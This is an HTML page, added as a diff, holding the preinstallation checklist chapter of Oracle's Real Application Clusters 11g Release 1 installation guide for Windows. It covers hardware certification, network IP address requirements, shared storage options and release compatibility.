@@ -1,0 +1,515 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Preinstallation Checklist</title>
+<meta http-equiv="Content-Type" content="text/html; charset=us-ascii" />
+<meta http-equiv="Content-Language" content="en" />
+<meta http-equiv="Content-Style-Type" content="text/css" />
+<meta http-equiv="Content-Script-Type" content="text/javascript" />
+<meta name="robots" content="all" scheme="http://www.robotstxt.org/" />
+<meta name="generator" content="Oracle DARB XHTML Converter (Mode = document) - Version 5.0 Build 54" />
+<meta name="Date" content="2005-07-10T12:57:20+08:00" />
+<meta name="doctitle" content="Oracle&reg; Real Application Clusters Installation Guide 11g Release 1 (11.1) for Microsoft Windows" />
+<meta name="partno" content="B28251-01" />
+<link rel="Start" href="../../index.htm" title="Home" type="text/html" />
+<link rel="Copyright" href="../../dcommon/html/cpyr.htm" title="Copyright" type="text/html" />
+<link rel="Stylesheet" href="../../dcommon/css/blafdoc.css" title="Default" type="text/css" />
+<link rel="Contents" href="toc.htm" title="Contents" type="text/html" />
+<link rel="Index" href="index.htm" title="Index" type="text/html" />
+<link rel="Prev" href="whatsnew.htm" title="Previous" type="text/html" />
+<link rel="Next" href="racinstl.htm" title="Next" type="text/html" />
+<link rel="alternate" href="../b28251.pdf" title="PDF version" type="application/pdf" />
+</head>
+<body>
+<div class="header">
+<div class="zz-skip-header"><a name="top" id="top" href="#BEGIN">Skip Headers</a></div>
+<table class="simple oac_no_warn" summary="" cellspacing="0" cellpadding="0" width="100%">
+<tr>
+<td align="left" valign="top"><b>Oracle&reg; Real Application Clusters Installation Guide<br />
+11g Release 1 (11.1) for Microsoft Windows</b><br />
+Part Number B28251-01</td>
+<td valign="bottom" align="right">
+<table class="icons oac_no_warn" summary="" cellspacing="0" cellpadding="0" width="245">
+<tr>
+<td align="center" valign="top"><a href="../../index.htm"><img width="24" height="24" src="../../dcommon/gifs/doclib.gif" alt="Go to Documentation Home" /><br />
+<span class="icon">Home</span></a></td>
+<td align="center" valign="top"><a href="../../nav/portal_booklist.htm"><img width="24" height="24" src="../../dcommon/gifs/booklist.gif" alt="Go to Book List" /><br />
+<span class="icon">Book List</span></a></td>
+<td align="center" valign="top"><a href="toc.htm"><img width="24" height="24" src="../../dcommon/gifs/toc.gif" alt="Go to Table of Contents" /><br />
+<span class="icon">Contents</span></a></td>
+<td align="center" valign="top"><a href="index.htm"><img width="24" height="24" src="../../dcommon/gifs/index.gif" alt="Go to Index" /><br />
+<span class="icon">Index</span></a></td>
+<td align="center" valign="top"><a href="../../dcommon/html/feedback.htm"><img width="24" height="24" src="../../dcommon/gifs/feedbck2.gif" alt="Go to Feedback page" /><br />
+<span class="icon">Contact Us</span></a></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+<hr />
+<table class="simple oac_no_warn" summary="" cellspacing="0" cellpadding="0" width="100%">
+<tr>
+<td align="left" valign="top">
+<table class="simple oac_no_warn" summary="" cellspacing="0" cellpadding="0" width="98">
+<tr>
+<td align="center" valign="top"><a href="whatsnew.htm"><img width="24" height="24" src="../../dcommon/gifs/leftnav.gif" alt="Go to previous page" /><br />
+<span class="icon">Previous</span></a></td>
+<td align="center" valign="top"><a href="racinstl.htm"><img width="24" height="24" src="../../dcommon/gifs/rightnav.gif" alt="Go to next page" /><br />
+<span class="icon">Next</span></a></td>
+</tr>
+</table>
+</td>
+<td align="right" valign="top" style="font-size: 90%"><a href="../b28251.pdf">View PDF</a></td>
+</tr>
+</table>
+<a name="BEGIN" id="BEGIN"></a></div>
+<div class="IND"><!-- End Header --><a id="CIHHEJAG" name="CIHHEJAG"></a>
+<h1 class="chapter"><span class="secnum">1</span> Preinstallation Checklist</h1>
+<p>Most errors that occur when installing Oracle Clusterware occur due to a failure to complete all of the required steps before starting the Oracle Universal Installer (OUI). Use the checklist in this chapter to ensure that you complete all of the required preinstallation tasks. Follow the links in this chapter to go directly to the relevant section or Web site where a task is described. The topics in this chapter include:</p>
+<ul>
+<li>
+<p><a href="#BHACBGII">Before You Start: Planning your Installation</a></p>
+</li>
+<li>
+<p><a href="#BHAHHIFG">Server Hardware, Network and Operating System Overview</a></p>
+</li>
+<li>
+<p><a href="#BHADIAEG">Shared Storage Overview</a></p>
+</li>
+<li>
+<p><a href="#BHADAAJC">Additional Information to Prepare for Installation</a></p>
+</li>
+</ul>
+<a id="BHACBGII" name="BHACBGII"></a>
+<div class="sect1"><!-- infolevel="all" infotype="General" -->
+<h2 class="sect1"><span class="secnum">1.1</span> Before You Start: Planning your Installation</h2>
+<p>This section provides a list of tasks that Oracle recommends that you complete before you begin to install Oracle Clusterware. Whether your location is a Tier IV data center with a large system administration team, storage administrators, network administrators, database administrators, and third-party hardware and software vendors, or you are a project team of one, planning is important to ensure that your installation succeeds.</p>
+<p>It is beyond the scope of this book to advise how to determine hardware sizing or capacity planning for your installation. Note that with Oracle Clusterware and Oracle Real Application Clusters (Oracle RAC), you can add nodes and instances as needed in response to increased workloads. Review and complete the following steps as part of your installation plan:</p>
+<ul>
+<li>
+<p><a href="#BABDHBAI">Check Oracle<span class="italic">MetaLink</span></a></p>
+</li>
+<li>
+<p><a href="#BHAEEAAB">Check Oracle Technical Network</a></p>
+</li>
+<li>
+<p><a href="#BHACIIBA">Review How to Use Cluster Verification Utility</a></p>
+</li>
+<li>
+<p><a href="#BHAHFHAH">Review and Back Up Existing Oracle Installations</a></p>
+</li>
+<li>
+<p><a href="#BABFDJDA">Review Globalization Requirements</a></p>
+</li>
+<li>
+<p><a href="#BHABABDG">Review Documentation</a></p>
+</li>
+</ul>
+<a id="BABDHBAI" name="BABDHBAI"></a>
+<div class="sect2">
+<h3 class="sect2"><span class="secnum">1.1.1</span> Check <a id="sthref35" name="sthref35"></a>Oracle<span class="italic">MetaLink</span></h3>
+<p>Before you decide whether you want to install Oracle 11<span class="italic">g</span> Release 1 (11.1) on existing hardware, or decide what server and storage hardware to purchase for an installation, log on to Oracle<span class="italic">MetaLink</span> (<code><a href="https://metalink.oracle.com">https://metalink.oracle.com</a></code>), and click the <span class="bold">Certify</span> tab. Check the Certification Matrix for Oracle RAC for the operating system platform on which you intend to install, to ensure that your hardware configuration is supported for use with Oracle Clusterware, and, if you intend to install it, Oracle RAC. You can receive guidance about supported hardware options that can assist you with your purchasing decisions.</p>
+<p>At the time of this release, you can also check the following URL for direct access to the Certification Matrix:</p>
+<p><code><a href="http://www.oracle.com/technology/support/metalink/index.html">http://www.oracle.com/technology/support/metalink/index.html</a></code></p>
+<p>In addition to specific certified hardware configurations, the Certify page provides support and patch information, and general advice about how to proceed with an Oracle Clusterware or Oracle Clusterware with Oracle RAC 11<span class="italic">g</span> Release 1 (11.1) installation, including important information about vendor clusterware and other configuration issues.</p>
+<div class="infoboxnote">
+<p class="notep1">Note:</p>
+Contact your Oracle sales representative if you do not have an Oracle<span class="italic">MetaLink</span> account.</div>
+<p>Also, you may want to refer to Oracle.com (<code><a href="http://www.oracle.com">http://www.oracle.com</a></code>) for additional resources about planning for specific implementation scenarios, best practices, and other information that can help you with your installation plan. In particular, refer to the following Web site:</p>
+<p><code><a href="http://www.oracle.com/technology/products/database/clustering/index.html">http://www.oracle.com/technology/products/database/clustering/index.html</a></code></p>
+</div>
+<!-- class="sect2" -->
+<a id="BHAEEAAB" name="BHAEEAAB"></a>
+<div class="sect2"><!-- infolevel="all" infotype="General" -->
+<h3 class="sect2"><span class="secnum">1.1.2</span> Check Oracle Technical Network</h3>
+<p>The Oracle Technical Network (OTN) contains white papers about deployment options, such as capacity planning, best practices on various NFS platforms, and extended Oracle RAC deployments, which are not addressed in this guide. You can review papers at the following Web site:</p>
+<p><code><a href="http://www.oracle.com/technology/products/database/clustering/index.html">http://www.oracle.com/technology/products/database/clustering/index.html</a></code></p>
+</div>
+<!-- class="sect2" -->
+<a id="BHACIIBA" name="BHACIIBA"></a>
+<div class="sect2"><!-- infolevel="all" infotype="General" -->
+<h3 class="sect2"><span class="secnum">1.1.3</span> Review How to Use Cluster Verification Utility</h3>
+<p>Oracle provides Cluster Verification Utility (CVU) to perform system checks in preparation for installation, patch updates, or other system changes. Learning how to use CVU can ensure that you have completed the required system configuration and preinstallation steps so that your installation, update, or patch operation completes successfully.</p>
+<p>If you have a vendor performing system or preinstallation configuration steps for you, then ask the vendor to complete the relevant CVU check to ensure that your system is configured correctly.</p>
+</div>
+<!-- class="sect2" -->
+<a id="BHAHFHAH" name="BHAHFHAH"></a>
+<div class="sect2"><!-- infolevel="all" infotype="General" -->
+<h3 class="sect2"><span class="secnum">1.1.4</span> Review and Back Up Existing Oracle Installations</h3>
+<p>If you have an existing Oracle installation, then document version numbers, patches, and other configuration information, and review upgrade procedures for your existing installation. Review the upgrade documentation before proceeding with your installation to decide how you want to proceed.</p>
+<p>For upgrades, note the following:<a id="sthref36" name="sthref36"></a><a id="sthref37" name="sthref37"></a><a id="sthref38" name="sthref38"></a><a id="sthref39" name="sthref39"></a></p>
+<ul>
+<li>
+<p>You can only have one version of Oracle Clusterware running on a cluster at a time.</p>
+</li>
+<li>
+<p>You can have multiple Oracle homes of Oracle 10<span class="italic">g</span> Release 1 or later on your cluster. However, the Oracle homes must be equal to or less than the version of Oracle Clusterware that is installed; you cannot have a version of Oracle Database on Oracle Clusterware that was released after the version of Oracle Clusterware that you are running.</p>
+</li>
+<li>
+<p>You can install earlier or later versions of Automatic Storage Manager (ASM). Both forward and backward compatibility is available with different versions of ASM. However, if you mix software versions, then ASM functionality reverts to the earliest software installation that it supports. For example, if you install Oracle Clusterware 11<span class="italic">g</span> with ASM, and you use it to support an existing Oracle Database release 10.2.0.3 installation, then ASM functionality is equivalent to that available only in the Oracle Database 10.2 release version.</p>
+</li>
+<li>
+<p>Starting with release 10.1.0.6 and 10.2.0.3, you can use Database Upgrade Assistant (DBUA) for patch set upgrades with Oracle RAC. You can also use DBUA to upgrade between major point releases of Oracle RAC (for example, from 10.1 to 10.2, or 10.2 to 11g).</p>
+</li>
+<li>
+<p>If you want to upgrade Oracle Clusterware Release 10.2 to Oracle Clusterware Release 11<span class="italic">g</span>, then you must first apply the 10.2.0.3 or later patchset.</p>
+</li>
+<li>
+<p>If you intend to install Oracle Database, then it is faster to install all of the patches on the earlier database before creating a new database. For example, patch the Oracle Clusterware home, patch the database home, and then create the new database, instead of patching the Oracle Clusterware home, creating the database home, and then patching the database.</p>
+</li>
+<li>
+<p>As with any system change, back up your existing database before attempting to install new software.</p>
+</li>
+</ul>
+<div class="infoboxnotealso">
+<p class="notep1">See Also:</p>
+<span class="italic">Oracle Database Upgrade Guide</span></div>
+</div>
+<!-- class="sect2" -->
+<a id="BABFDJDA" name="BABFDJDA"></a>
+<div class="sect2"><!-- infolevel="all" infotype="General" -->
+<h3 class="sect2"><span class="secnum">1.1.5</span> Review Globalization<a id="sthref40" name="sthref40"></a> Requirements</h3>
+<p>Review the <span class="italic">Oracle Database Globalization Support Guide</span> to identify any additional steps that you may need to complete as part of your installation before you:</p>
+<ul>
+<li>
+<p>Upgrade an existing database with additional character sets or languages</p>
+</li>
+<li>
+<p>Start an installation during which you want to add languages other than the default language, English</p>
+</li>
+</ul>
+</div>
+<!-- class="sect2" -->
+<a id="BHABABDG" name="BHABABDG"></a>
+<div class="sect2"><!-- infolevel="all" infotype="General" -->
+<h3 class="sect2"><span class="secnum">1.1.6</span> Review Documentation</h3>
+<p>Review this section, as well as the Preinstallation and Storage chapters that appear later in this book, to ensure that you have completed all of the required steps for a successful installation. This information will also enable you to receive assistance with completing these steps. In addition, review the Release Notes and Oracle<span class="italic">Metalink</span> (<code><a href="https://metalink.oracle.com">https://metalink.oracle.com</a></code>) to ensure that you have the most current information about system requirements and other information that can affect your installation. The short time that this review requires can prevent you from spending a lot more time when you later must research installation errors.</p>
+<p>Oracle recommends that you install a Web browser on each of your cluster nodes. This enables you to use Oracle Enterprise Manager with Oracle RAC. It also enables you to access online documentation which is available in PDF and HTML formats.</p>
+<div class="infoboxnotealso">
+<p class="notep1">See Also:</p>
+<span class="italic">Oracle Database Concepts</span> for an overview of Oracle Database, and <span class="italic">Oracle Real Application Clusters Administration and Deployment Guide</span> for additional information about Oracle Clusterware or Oracle RAC configuration and deployment. Also review the Oracle Database installation guide or Oracle Real Application Clusters installation guide for your platform, if you intend to install Oracle Database or Oracle RAC.</div>
+</div>
+<!-- class="sect2" --></div>
+<!-- class="sect1" -->
+<a id="BHAHHIFG" name="BHAHHIFG"></a>
+<div class="sect1">
+<h2 class="sect1"><span class="secnum">1.2</span> Server Hardware, Network and Operating System Overview</h2>
+<p>You must complete all of the required hardware, network, and operating system preinstallation steps for Oracle software. Failure to complete the required preinstallation steps is the most common reason for failed installations.</p>
+<p>By the time you start performing the Oracle preinstallation steps described in this guide, you should have already completed installing CPUs, memory, local disks, network cards, host bus adaptors, interconnects, and any other networking or server hardware; and you should have installed the operating system, and any vendor clusterware. Review your vendor documentation to complete these tasks, and if relevant, work with your vendor to complete any Oracle preinstallation steps that are listed here to confirm that the vendor hardware and software is correctly configured.</p>
+<p>Server and network preparation include the following tasks:</p>
+<ul>
+<li>
+<p><a href="#BHACGCII">Review Server Hardware and Software Requirements</a></p>
+</li>
+<li>
+<p><a href="#BHACHJJJ">Network Connections Overview</a></p>
+</li>
+<li>
+<p><a href="#BABDBCID">Platform-Specific Server Configuration Overview</a></p>
+</li>
+</ul>
+<a id="BHACGCII" name="BHACGCII"></a>
+<div class="sect2"><!-- infolevel="all" infotype="General" -->
+<h3 class="sect2"><span class="secnum">1.2.1</span> Review Server Hardware and Software Requirements</h3>
+<p>This section contains a summary of server hardware and software configuration requirements and recommendations.</p>
+<a id="sthref41" name="sthref41"></a>
+<p class="subhead2">Oracle Requires</p>
+<p>Each node in a cluster requires the following:</p>
+<ul>
+<li>
+<p>Supported server hardware, including processors and system configuration.</p>
+<p>Review Oracle<span class="italic">MetaLink</span> before starting an installation on your existing hardware, and before purchasing new hardware, to ensure that the hardware is supported with Oracle Clusterware, and, if you install it, Oracle RAC 11<span class="italic">g</span> Release 1 (11.1).</p>
+<div class="infoboxnote">
+<p class="notep1">Note:</p>
+If you install Oracle RAC, then you must use the same operating system on each node in your cluster. Oracle strongly recommends that you use the same software configurations on each node of your cluster.</div>
+</li>
+<li>
+<p>External shared disks for storing the Oracle Clusterware files, such as the Oracle Cluster Registry (OCR) and the voting disks, as well as for the database files, as summarized in <a href="#BHADIAEG">"Shared Storage Overview"</a>.</p>
+<div class="infoboxnote">
+<p class="notep1">Note:</p>
+Oracle Clusterware software <span class="italic">cannot</span> be installed on Oracle Cluster File System (OCFS). Oracle Clusterware software can be installed on network-attached storage (NAS).</div>
+</li>
+<li>
+<p>If you install Oracle RAC, a supported interconnect software protocol on each node, to support Oracle Clusterware voting disk polling, and to support Cache Fusion. Your interconnect <span class="italic">must</span> be certified by Oracle for your platform.</p>
+</li>
+</ul>
+<a id="sthref42" name="sthref42"></a>
+<p class="subhead2">Oracle Recommends</p>
+<p>Oracle recommends the following to simplify server installation and maintenance, and to prevent service issues</p>
+<ul>
+<li>
+<p>Enabling the Network Time Protocol feature of most operating systems, and ensuring that all nodes use the same reference Network Time Protocol server.</p>
+</li>
+<li>
+<p>Configuring redundant switches, for all cluster sizes.</p>
+</li>
+<li>
+<p>Using identical server hardware on each node, to simplify server maintenance.</p>
+</li>
+</ul>
+<a id="sthref43" name="sthref43"></a>
+<p class="subhead2">Additional Options</p>
+<ul>
+<li>
+<p>Though you do not need to use vendor clusterware with Oracle Clusterware, Oracle Clusterware can interoperate with many vendor clusterware implementations. However, <span class="italic">you</span> <span class="italic">must</span> <span class="italic">install Oracle Clusterware to use Oracle RAC</span>. When you use vendor clusterware, Oracle Clusterware defers to the vendor clusterware for some tasks, such as node membership decisions.</p>
+</li>
+<li>
+<p>You may require third-party vendor clusterware if you use a non-ethernet interconnect.</p>
+</li>
+</ul>
+</div>
+<!-- class="sect2" -->
+<a id="BHACHJJJ" name="BHACHJJJ"></a>
+<div class="sect2"><!-- infolevel="all" infotype="General" -->
+<h3 class="sect2"><span class="secnum">1.2.2</span> Network Connections Overview</h3>
+<p>Before you begin to set up network configurations, ensure that your network administrator has created at least two network addresses on your DHCP server for each node. These addresses serve as the address for each node's public and virtual IP addresses.</p>
+<p><a href="#BABBGFDF">Table 1-1</a> and the content that follows it is an overview of IP address requirements:</p>
+<div class="tblformal"><a id="sthref44" name="sthref44"></a><a id="BABBGFDF" name="BABBGFDF"></a>
+<p class="titleintable">Table 1-1 Overview of IP Address Requirements for Each Node with Oracle Clusterware</p>
+<table class="Formal" title="Overview of IP Address Requirements for Each Node with Oracle Clusterware" summary="Overview of IP address requirements for Oracle Clusterware" dir="ltr" border="1" width="100%" frame="hsides" rules="groups" cellpadding="3" cellspacing="0">
+<thead>
+<tr align="left" valign="top">
+<th align="left" valign="bottom" id="r1c1-t7">IP Address Type</th>
+<th align="left" valign="bottom" id="r1c2-t7">Purpose</th>
+<th align="left" valign="bottom" id="r1c3-t7">Where Registered</th>
+<th align="left" valign="bottom" id="r1c4-t7">Pingable from Clients</th>
+</tr>
+</thead>
+<tbody>
+<tr align="left" valign="top">
+<td align="left" id="r2c1-t7" headers="r1c1-t7">
+<p>Virtual IP address</p>
+</td>
+<td align="left" headers="r2c1-t7 r1c2-t7">
+<p>Address for client requests and the address to use to fail over requests to other nodes</p>
+</td>
+<td align="left" headers="r2c1-t7 r1c3-t7">
+<p>DNS (recommended).</p>
+</td>
+<td align="left" headers="r2c1-t7 r1c4-t7">
+<p>No, before installation; yes, after installation</p>
+</td>
+</tr>
+<tr align="left" valign="top">
+<td align="left" id="r3c1-t7" headers="r1c1-t7">
+<p>Public IP address</p>
+</td>
+<td align="left" headers="r3c1-t7 r1c2-t7">
+<p>Address for service requests</p>
+</td>
+<td align="left" headers="r3c1-t7 r1c3-t7">
+<p>DNS (recommended).</p>
+</td>
+<td align="left" headers="r3c1-t7 r1c4-t7">
+<p>Yes</p>
+</td>
+</tr>
+<tr align="left" valign="top">
+<td align="left" id="r4c1-t7" headers="r1c1-t7">
+<p>Private IP address</p>
+</td>
+<td align="left" headers="r4c1-t7 r1c2-t7">
+<p>Address for inter-node communication only</p>
+</td>
+<td align="left" headers="r4c1-t7 r1c3-t7">
+<p>DNS (recommended). Must be resolvable only by other nodes in the cluster, and should be on dedicated network hardware.</p>
+</td>
+<td align="left" headers="r4c1-t7 r1c4-t7">
+<p>No</p>
+</td>
+</tr>
+</tbody>
+</table>
+<br /></div>
+<!-- class="tblformal" -->
+<p>The following is additional information about each address type:</p>
+<ul>
+<li>
+<p><span class="bold">Virtual IP address</span>&#x2014;A public IP address for each node, to be used as the Virtual IP address for client connections. If a node fails, then Oracle Clusterware fails over the VIP address to an available node.</p>
+<p>During installation, the public virtual IP address (VIP) for each node is associated with the same interface name on every node that is part of your cluster. If you have a domain name server (DNS), then register the host names for the VIP with the DNS, so that it is resolvable from any client, as well as the cluster nodes. The VIP should not be in use at the time of the installation, because this is an IP address that Oracle Clusterware manages.<a id="sthref45" name="sthref45"></a></p>
+</li>
+<li>
+<p><span class="bold">Public IP address</span>&#x2014;A public host name address for each node, typically assigned by the system administrator during initial system configuration. The public IP address name must be resolvable to the hostname. Register both the public and IP and the VIP address with the DNS. If you do not have a DNS, then you must make sure that both public IP addresses are in the node <code>/etc/hosts</code> file (for all cluster nodes), and the <code>/etc/hosts</code> file on any client system that requires access to the database.</p>
+</li>
+<li>
+<p><span class="bold">Private IP address</span>&#x2014;A private internet protocol (IP) address for each node that serves as the private interconnect address for internode cluster communication only. The following must be true for each private IP address:</p>
+<ul>
+<li>
+<p>It must be separate from the public network</p>
+</li>
+<li>
+<p>It must be accessible on the same network interface on each node</p>
+</li>
+<li>
+<p>It must have a unique address on each node</p>
+</li>
+<li>
+<p>It must be connected to a network switch between the nodes for the private network</p>
+</li>
+</ul>
+<p>The private interconnect is used for internode communication by both Oracle Clusterware and Oracle RAC. Oracle recommends that it is configured on a dedicated switch (or switches) that are not connected to anything other than the nodes in the same cluster.</p>
+<p>During the Oracle Clusterware installation, the information that you enter as the private IP address determines which private interconnects are used by Oracle Clusterware for its own communication. They must all be available, and the private interconnect interface for each node must be capable of responding to a <code>ping</code> command from another node in the cluster.</p>
+<p>Oracle recommends that you use a logical Internet Protocol (IP) address that is available across all of the private networks, and that you take advantage of any available operating system-based failover mechanism by configuring it according to your third-party vendor's instructions for using their product to support failover.</p>
+<div class="infoboxnote">
+<p class="notep1">Note:</p>
+All host names must conform to the RFC 952 standard, which permits alphanumeric characters. Host names using underscores ("_") are not allowed.</div>
+</li>
+</ul>
+</div>
+<!-- class="sect2" -->
+<a id="BABDBCID" name="BABDBCID"></a>
+<div class="sect2"><!-- infolevel="all" infotype="General" -->
+<h3 class="sect2"><span class="secnum">1.2.3</span> Platform-Specific Server Configuration Overview</h3>
+<p>In addition to the standard system requirements configuration, deployment on specific server hardware can include additional operating system configuration steps. Review the Preinstallation chapter, and check the Oracle<span class="italic">Metalink</span> Certify page to ensure that you are aware of any additional requirements or recommendations for your specific hardware platform configuration.</p>
+</div>
+<!-- class="sect2" --></div>
+<!-- class="sect1" -->
+<a id="BHADIAEG" name="BHADIAEG"></a>
+<div class="sect1"><!-- infolevel="all" infotype="General" -->
+<h2 class="sect1"><span class="secnum">1.3</span> Shared Storage Overview</h2>
+<p>Oracle Clusterware software includes the Oracle Cluster Registry (OCR) and voting disks. These must be located on one of two storage options:</p>
+<ul>
+<li>
+<p>A shared file system certified by Oracle for your platform</p>
+</li>
+<li>
+<p>Shared raw disk partitions</p>
+<div class="infoboxnote">
+<p class="notep1">Note:</p>
+Shared raw disk partitions are only supported as un upgrade option, using DBCA.</div>
+</li>
+</ul>
+<p>If you intend to install Oracle RAC, then to store data and recovery files, you must select one of three storage options:</p>
+<ul>
+<li>
+<p>Automatic Storage Management</p>
+</li>
+<li>
+<p>A shared file system certified by Oracle for your platform</p>
+</li>
+<li>
+<p>Shared Raw disk partitions</p>
+</li>
+</ul>
+<p>Storage options can change over the lifetime of a release, as new storage vendors are certified. Therefore, be sure to review Oracle<span class="italic">MetaLink</span> to confirm that the storage option that you want to use is supported for your platform.</p>
+</div>
+<!-- class="sect1" -->
+<a id="BHADAAJC" name="BHADAAJC"></a>
+<div class="sect1"><!-- infolevel="all" infotype="General" -->
+<h2 class="sect1"><span class="secnum">1.4</span> Additional Information to Prepare for Installation</h2>
+<p>This section contains additional information about Oracle Clusterware, Oracle Automatic Storage Management, and Oracle RAC, that may be helpful for you to read to decide how you want to configure your installation. It contains the following sections:</p>
+<ul>
+<li>
+<p><a href="#BABHEAHJ">Oracle Clusterware and Vendor Clusterware</a></p>
+</li>
+<li>
+<p><a href="#BABBFGFJ">Shared Components of Oracle Real Application Clusters Installations</a></p>
+</li>
+<li>
+<p><a href="#CHDFEFBC">Oracle Database 11<span class="italic">g</span> Real Application Clusters Release Compatibility</a></p>
+</li>
+</ul>
+<a id="BABHEAHJ" name="BABHEAHJ"></a>
+<div class="sect2">
+<h3 class="sect2"><span class="secnum">1.4.1</span> Oracle Clusterware and Vendor Clusterware</h3>
+<p>Oracle Clusterware provides clustering services. You do not require vendor clusterware when you use Oracle Clusterware. If you intend to install Oracle RAC, then you must install Oracle Clusterware.</p>
+</div>
+<!-- class="sect2" -->
+<a id="BABBFGFJ" name="BABBFGFJ"></a>
+<div class="sect2">
+<h3 class="sect2"><span class="secnum">1.4.2</span> Shared Components of Oracle Real Application Clusters Installations</h3>
+<a id="i1028692" name="i1028692"></a>
+<p>If you intend to install Oracle Real Application Clusters (Oracle RAC) after installing Oracle Clusterware, note that all instances in Oracle RAC environments share the control file, server parameter file, redo log files, and all data files. These files must be placed on a shared cluster file system or on shared disks, and all the cluster database instances must have access to them. Each instance also has its own set of redo log files. During failures, shared access to redo log files enables surviving instances to perform recovery. <a id="sthref46" name="sthref46"></a><a id="sthref47" name="sthref47"></a><a id="sthref48" name="sthref48"></a><a id="sthref49" name="sthref49"></a><a id="sthref50" name="sthref50"></a></p>
+</div>
+<!-- class="sect2" -->
+<a id="CHDFEFBC" name="CHDFEFBC"></a>
+<div class="sect2">
+<h3 class="sect2"><span class="secnum">1.4.3</span> Oracle Database 11<span class="italic">g</span> Real Application Clusters Release Compatibility</h3>
+<p>You can install and operate different releases of Oracle Database software on the same computer:</p>
+<ul>
+<li>
+<p>If you have an existing Oracle home, then you can create a new Oracle home and install Oracle Database 11<span class="italic">g</span> into the new Oracle home. You should install Oracle Clusterware in a separate Oracle Clusterware home, and if you have an existing Oracle Clusterware installation, then you must use the older Oracle Clusterware software, or upgrade that Oracle Cluster software. Each node can have only one Oracle Clusterware home.</p>
+<p>During installation, Oracle Universal Installer (OUI) prompts you to install additional Oracle Database 10<span class="italic">g</span> components if you have not already installed all of them.</p>
+</li>
+<li>
+<p>If you intend to install Oracle RAC, then OUI lets you de-install and re-install Oracle RAC if needed.</p>
+</li>
+<li>
+<p>If you are running the Oracle9<span class="italic">i</span> release of Oracle RAC, and you want to continue to use that release, then you must run cluster software that is compatible with that release, such as Oracle Cluster Manager or a third party cluster software. Oracle Clusterware release 11<span class="italic">g</span> is not compatible with Oracle9<span class="italic">i</span> database software.</p>
+</li>
+<li>
+<p>If OUI detects a previous database release, then OUI asks you about your upgrade preferences. You have the option to upgrade one of the previous release databases with DBUA or to create a new database using DBCA. The information collected during this dialog is passed to DBUA or DBCA after the software is installed.</p>
+<div class="infoboxnote">
+<p class="notep1">Note:</p>
+Do not move Oracle binaries from the Oracle home to another location. Doing so can cause dynamic link failures.</div>
+</li>
+<li>
+<p>You can run different releases of Oracle Database and Automatic Storage Management (ASM). If the Oracle Database release and the ASM release are the same release, then they can both run out of the same Oracle home. If they are different releases, then the Oracle Database release and the ASM release must be in their separate release homes. For example, you can install an ASM release 11<span class="italic">g</span> Release 1 (11.1) instance and use it with Oracle Database 10g Release 2 (10.2) database, or you can install an Oracle 11<span class="italic">g</span> Release 1 (11.1) database and use it with an ASM 10g Release 2 (10.2) instance.</p>
+<div class="infoboxnote">
+<p class="notep1">Note:</p>
+When using different release ASM and Oracle Database releases, the functionality of each is dependent on the functionality of the earlier software release. For example, an Oracle Database 10<span class="italic">g</span> release 11.1 using an ASM 11.1.0.2 instance will not be able to use new features available for ASM in the 11.1.0.2 release, but instead only ASM 11.1 features. Conversely, an Oracle Database 10<span class="italic">g</span> release 11.1.0.2 using an ASM instance release 11.1 will function like a release 11.1 database.</div>
+</li>
+</ul>
+</div>
+<!-- class="sect2" -->
+<a id="CHDEGGEJ" name="CHDEGGEJ"></a>
+<div class="sect2"><!-- infolevel="all" infotype="General" -->
+<h3 class="sect2"><span class="secnum">1.4.4</span> Preinstallation Requirements for Oracle Configuration Manager</h3>
+<p>Before installing Oracle Configuration Manager (OCM), ensure that all the following preinstallation requirements are met:</p>
+<ul>
+<li>
+<p>You must have a Customer Support Identifier (CSI) and an Oracle<span class="italic">MetaLink</span> User Name available because this information is required when installing OCM.</p>
+</li>
+<li>
+<p>You must specify a valid<a id="sthref51" name="sthref51"></a> country code while installing OCM. Country codes are associated with the <a id="sthref52" name="sthref52"></a>Oracle<span class="italic">MetaLink</span> User Name. Refer to the Oracle<span class="italic">Metalink</span> site (<code><a href="http://metalink.oracle.com">http://metalink.oracle.com</a></code>) if you encounter registration failures and are uncertain whether you have specified the correct country code. The country associated with the Oracle<span class="italic">MetaLink</span> User Name can be found in the Profile section under the Licenses link.</p>
+</li>
+</ul>
+<div class="infoboxnote">
+<p class="notep1">Note:</p>
+OCM is only available when you perform a Custom installation.</div>
+</div>
+<!-- class="sect2" --></div>
+<!-- class="sect1" --></div>
+<!-- class="ind" -->
+<div class="footer">
+<hr />
+<table class="simple oac_no_warn" summary="" cellspacing="0" cellpadding="0" width="100%">
+<col width="3*" />
+<col width="3*" />
+<col width="3*" />
+<tr>
+<td align="left">
+<table class="simple oac_no_warn" summary="" cellspacing="0" cellpadding="0" width="98">
+<tr>
+<td align="center" valign="top"><a href="whatsnew.htm"><img width="24" height="24" src="../../dcommon/gifs/leftnav.gif" alt="Go to previous page" /><br />
+<span class="icon">Previous</span></a></td>
+<td align="center" valign="top"><a href="racinstl.htm"><img width="24" height="24" src="../../dcommon/gifs/rightnav.gif" alt="Go to next page" /><br />
+<span class="icon">Next</span></a></td>
+</tr>
+</table>
+</td>
+<td style="font-size: 90%" align="center" class="copyrightlogo"><img width="144" height="18" src="../../dcommon/gifs/oracle.gif" alt="Oracle" /><br />
+<a href="../../dcommon/html/cpyr.htm">Copyright&nbsp;&copy;&nbsp;2005, 2007,&nbsp;Oracle.&nbsp;All&nbsp;rights&nbsp;reserved.</a></td>
+<td align="right">
+<table class="icons oac_no_warn" summary="" cellspacing="0" cellpadding="0" width="245">
+<tr>
+<td align="center" valign="top"><a href="../../index.htm"><img width="24" height="24" src="../../dcommon/gifs/doclib.gif" alt="Go to Documentation Home" /><br />
+<span class="icon">Home</span></a></td>
+<td align="center" valign="top"><a href="../../nav/portal_booklist.htm"><img width="24" height="24" src="../../dcommon/gifs/booklist.gif" alt="Go to Book List" /><br />
+<span class="icon">Book List</span></a></td>
+<td align="center" valign="top"><a href="toc.htm"><img width="24" height="24" src="../../dcommon/gifs/toc.gif" alt="Go to Table of Contents" /><br />
+<span class="icon">Contents</span></a></td>
+<td align="center" valign="top"><a href="index.htm"><img width="24" height="24" src="../../dcommon/gifs/index.gif" alt="Go to Index" /><br />
+<span class="icon">Index</span></a></td>
